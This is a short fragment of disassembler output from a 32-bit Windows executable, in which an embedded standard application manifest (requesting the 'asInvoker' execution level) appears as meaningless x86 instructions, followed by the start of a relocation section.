  40888a:	je     0x4088f5
  40888c:	je     0x408907
  40888e:	and    BYTE PTR [esi+0x65],dh
  408891:	jb     0x408906
  408893:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40889a:	xor    BYTE PTR [esi],ch
  40889c:	xor    BYTE PTR [esi],ch
  40889e:	xor    BYTE PTR [edx],ah
  4088a0:	and    BYTE PTR [esi+0x61],ch
  4088a3:	ins    DWORD PTR es:[edi],dx
  4088a4:	gs cmp eax,0x41794d22
  4088aa:	jo     0x40891c
  4088ac:	ins    BYTE PTR es:[edi],dx
  4088ad:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4088b4:	cs popa 
  4088b6:	jo     0x408928
  4088b8:	and    ch,BYTE PTR [edi]
  4088ba:	ds or  eax,0x3c20200a
  4088c0:	je     0x408934
  4088c2:	jne    0x408937
  4088c4:	je     0x40890f
  4088c6:	outs   dx,BYTE PTR ds:[esi]
  4088c7:	outs   dx,WORD PTR ds:[esi]
  4088c9:	and    BYTE PTR [eax+0x6d],bh
  4088cc:	ins    BYTE PTR es:[edi],dx
  4088cd:	outs   dx,BYTE PTR ds:[esi]
  4088ce:	jae    0x40890d
  4088d0:	and    dh,BYTE PTR [ebp+0x72]
  4088d3:	outs   dx,BYTE PTR ds:[esi]
  4088d4:	cmp    dh,BYTE PTR [ebx+0x63]
  4088d7:	push   0x73616d65
  4088dc:	sub    eax,0x7263696d
  4088e1:	outs   dx,DWORD PTR ds:[esi]
  4088e2:	jae    0x408953
  4088e4:	data16 je 0x408914
  4088e7:	arpl   WORD PTR [edi+0x6d],bp
  4088ea:	cmp    ah,BYTE PTR [ecx+0x73]
  4088ed:	ins    DWORD PTR es:[edi],dx
  4088ee:	cs jbe 0x408923
  4088f1:	and    bh,BYTE PTR [esi]
  4088f3:	or     eax,0x2020200a
  4088f8:	and    BYTE PTR [ebx+esi*2],bh
  4088fb:	arpl   WORD PTR gs:[ebp+0x72],si
  4088ff:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  408907:	and    BYTE PTR [eax],ah
  408909:	and    BYTE PTR [eax],ah
  40890b:	cmp    al,0x72
  40890d:	gs jno 0x408985
  408910:	gs jae 0x408987
  408913:	gs fs push eax
  408916:	jb     0x408981
  408918:	jbe    0x408983
  40891a:	ins    BYTE PTR es:[edi],dx
  40891b:	gs addr16 gs jae 0x408940
  408920:	js     0x40898f
  408922:	ins    BYTE PTR es:[edi],dx
  408923:	outs   dx,BYTE PTR ds:[esi]
  408924:	jae    0x408963
  408926:	and    dh,BYTE PTR [ebp+0x72]
  408929:	outs   dx,BYTE PTR ds:[esi]
  40892a:	cmp    dh,BYTE PTR [ebx+0x63]
  40892d:	push   0x73616d65
  408932:	sub    eax,0x7263696d
  408937:	outs   dx,DWORD PTR ds:[esi]
  408938:	jae    0x4089a9
  40893a:	data16 je 0x40896a
  40893d:	arpl   WORD PTR [edi+0x6d],bp
  408940:	cmp    ah,BYTE PTR [ecx+0x73]
  408943:	ins    DWORD PTR es:[edi],dx
  408944:	cs jbe 0x40897a
  408947:	and    bh,BYTE PTR [esi]
  408949:	or     eax,0x2020200a
  40894e:	and    BYTE PTR [eax],ah
  408950:	and    BYTE PTR [eax],ah
  408952:	and    BYTE PTR [edx+esi*2],bh
  408955:	gs jno 0x4089cd
  408958:	gs jae 0x4089cf
  40895b:	gs fs inc ebp
  40895e:	js     0x4089c5
  408960:	arpl   WORD PTR [ebp+0x74],si
  408963:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40896a:	ins    BYTE PTR es:[edi],dx
  40896b:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40896f:	gs ins BYTE PTR es:[edi],dx
  408971:	cmp    eax,0x49736122
  408976:	outs   dx,BYTE PTR ds:[esi]
  408977:	jbe    0x4089e8
  408979:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40897d:	and    BYTE PTR [ebp+0x69],dh
  408980:	inc    ecx
  408981:	arpl   WORD PTR [ebx+0x65],sp
  408984:	jae    0x4089f9
  408986:	cmp    eax,0x6c616622
  40898b:	jae    0x4089f2
  40898d:	and    ch,BYTE PTR [edi]
  40898f:	ds or  eax,0x2020200a
  408995:	and    BYTE PTR [eax],ah
  408997:	and    BYTE PTR [edi+ebp*1],bh
  40899a:	jb     0x408a01
  40899c:	jno    0x408a13
  40899e:	gs jae 0x408a15
  4089a1:	gs fs push eax
  4089a4:	jb     0x408a0f
  4089a6:	jbe    0x408a11
  4089a8:	ins    BYTE PTR es:[edi],dx
  4089a9:	gs addr16 gs jae 0x4089ec
  4089ae:	or     eax,0x2020200a
  4089b3:	and    BYTE PTR [edi+ebp*1],bh
  4089b6:	jae    0x408a1d
  4089b8:	arpl   WORD PTR [ebp+0x72],si
  4089bb:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  4089c3:	cmp    al,0x2f
  4089c5:	je     0x408a39
  4089c7:	jne    0x408a3c
  4089c9:	je     0x408a14
  4089cb:	outs   dx,BYTE PTR ds:[esi]
  4089cc:	outs   dx,WORD PTR ds:[esi]
  4089ce:	ds or  eax,0x612f3c0a
  4089d4:	jae    0x408a49
  4089d6:	gs ins DWORD PTR es:[edi],dx
  4089d8:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4089dc:	.byte 0xd
  4089dd:	or     dl,BYTE PTR [eax+0x41]

Disassembly of section .reloc:

0040a000 <.reloc>:
  40a000:	add    BYTE PTR [eax+0x0],dh
  40a003:	add    BYTE PTR [eax+eax*1],cl
  40a006:	add    BYTE PTR [eax],al
  40a008:	mov    al,0x3b
	...
